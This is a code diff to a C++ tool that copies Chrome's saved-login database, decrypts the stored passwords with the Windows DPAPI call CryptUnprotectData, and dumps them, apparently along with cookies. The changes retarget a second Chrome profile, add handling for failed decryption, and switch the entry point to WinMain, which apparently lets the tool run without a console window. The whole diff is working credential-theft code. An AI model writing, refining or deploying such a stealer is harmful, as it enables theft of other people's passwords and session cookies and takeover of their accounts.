@@ -45,7 +45,8 @@ stringstream getPass(
 
 		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
 
-		CryptUnprotectData(
+		SetLastError(0);
+		BOOL result = CryptUnprotectData(
 			&encryptedPass, // In Data
 			NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
 			NULL,           // Optional entropy
@@ -55,7 +56,18 @@ stringstream getPass(
 							// used.
 			0,
 			&decryptedPass);
-		char *c = (char *)decryptedPass.pbData;
+
+		std::string strFailed("<failed>");
+		if (!result)
+		{
+			std::stringstream temp;
+
+			temp << "<failed> temp=0x" << std::hex << result;
+
+			strFailed = temp.str();
+		}
+
+		const char *c = result? (const char *)decryptedPass.pbData: strFailed.c_str();
 		while (isprint(*c)) {
 			dump << *c;
 			c++;
@@ -149,7 +161,8 @@ sqlite3* getDBHandler(char* dbFilePath) {
 bool copyDB(char *source, char *dest) {
 	//Form path for Chrome's Login Data 
 	string path = getenv("LOCALAPPDATA");
-	path.append("\\Google\\Chrome\\User Data\\Default\\");
+//	path.append("\\Google\\Chrome\\User Data\\Default\\");
+	path.append("\\Google\\Chrome\\User Data\\Profile 2\\");
 	path.append(source);
 	//copy the sqlite3 db from chrome directory 
 	//as we are not allowed to open it directly from there (chrome could also be running)
@@ -165,9 +178,30 @@ int deleleteDB(const char *fileName) {
 		cout << "Could not delete " << fileName << endl;
 	else
 		cout << fileName << " deleted... Bye bye" << endl;
+
+	return 0;
 }
-int main(int argc, char **argv)
+int WinMain(
+	HINSTANCE hInstance,
+	HINSTANCE hPrevInstance,
+	LPSTR     lpCmdLine,
+	int       nShowCmd
+)
 {
+	std::istringstream ss(lpCmdLine);
+	std::istream_iterator<std::string> begin(ss), end;
+
+	//putting all the tokens in the vector
+	std::vector<std::string> arrayTokens(begin, end);
+
+	std::vector<const char*> argv;
+	for (std::vector<std::string>::iterator itr = arrayTokens.begin(); itr != arrayTokens.end(); itr++)
+	{
+		argv.push_back((*itr).c_str());
+	}
+
+	int argc = argv.size();
+
 	int rc;
 	// Open Database
 	cout << "Copying db ..." << endl;
@@ -175,14 +209,15 @@ int main(int argc, char **argv)
 	sqlite3 *passwordsDB = getDBHandler("passwordsDB");
 	stringstream passwords = getPass(passwordsDB);
 	cout << passwords.str();
+
+
 	if (sqlite3_close(passwordsDB) == SQLITE_OK)
 		cout << "DB connection closed properly" << endl;
 	else
 		cout << "Failed to close DB connection" << endl;
 
-
 	bool flagCookies = false, flagPause = false;
-	for (int i = 1; i < argc; i++) {
+	for (int i = 0; i < argc; i++) {
 		if (strlen(argv[i]) < 2)continue;
 		switch (argv[i][1]) {
 		case 'c':
